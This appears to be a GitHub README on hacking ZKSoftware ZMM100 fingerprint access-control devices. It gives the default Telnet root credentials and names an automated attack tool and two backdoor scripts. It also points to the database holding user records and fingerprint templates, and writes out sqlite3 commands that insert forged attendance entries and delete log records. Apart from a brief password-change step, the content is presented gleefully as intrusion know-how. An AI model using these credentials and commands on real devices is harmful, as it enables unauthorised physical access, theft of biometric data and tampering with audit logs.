# Hacking Embedded Devices :

```
Hardware platform ZMM100 :
The fingerprint access control device Made by ZKSoftware.
```

* - Default User/Password : __root:solokey__
- Protocol : Telnet (23).

## Scripts :
 * __pwnit.py__ : Automated tool for hacking devices.
 * __hell__ : second backdoor.
 * __leak-data.sh__ : third backdoor.
 
 
 
## YouTube Video :

![image alt text](https://i.imgur.com/lxZCj4Z.png)
[https://www.youtube.com/watch?v=Zd1N0CbvR0k](https://www.youtube.com/watch?v=Zd1N0CbvR0k&feature=youtu.be)

## Change root password :

```
passwd
{ enter new root password }
cp /etc/passwd /mnt/mtdblock
cp /etc/passwd /mnt/mtdblock/data/
```

## More Info :

```
This directory "mnt/ramdisk" contains : picture.jpg , finger.bmp.
Web directory  "/mnt/mtdblock/service/webserver" contains : some shitty csl web files lol.
Database here : "/mnt/mtdblock/data/ZKDB.db"
Important tables : "ATT_LOGS" ( user logs ) , "USER_INFO" ( user informations ) , "fptemplate10"  ( finger print data ).
-- https://i.imgur.com/yNfVNSH.png ( ATT_LOGS ).
-- https://i.imgur.com/ujiIqzf.png ( USER_INFO ).
-- https://i.imgur.com/ilGwFZB.png ( fptemplate10 ).

> https://github.com/adrobinoga/zk-protocol/blob/master/sections/data-user.md#example-of-a-template-entry
SQLite ELF File : "/mnt/mtdblock/data/sqlite3_arm" --> ./sqlite3_arm ZKDB.db;

```

### Insert / Delete DATA :

>- Insert : ./sqlite3_arm ZKDB.db "INSERT INTO ATT_LOG VALUES (null,__'1224__,15,__'2019-04-12T00:00:00'__,'0','0',null,null,null,null,0);"

>- Delete log : ./sqlite3_arm ZKDB.db "DELETE FROM ATT_LOG WHERE ID = __1224__;"

- Shit its amazing 3:) !


 #### References :
https://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html
https://github.com/linsir/pyscripts/tree/master/zkteco_check_in
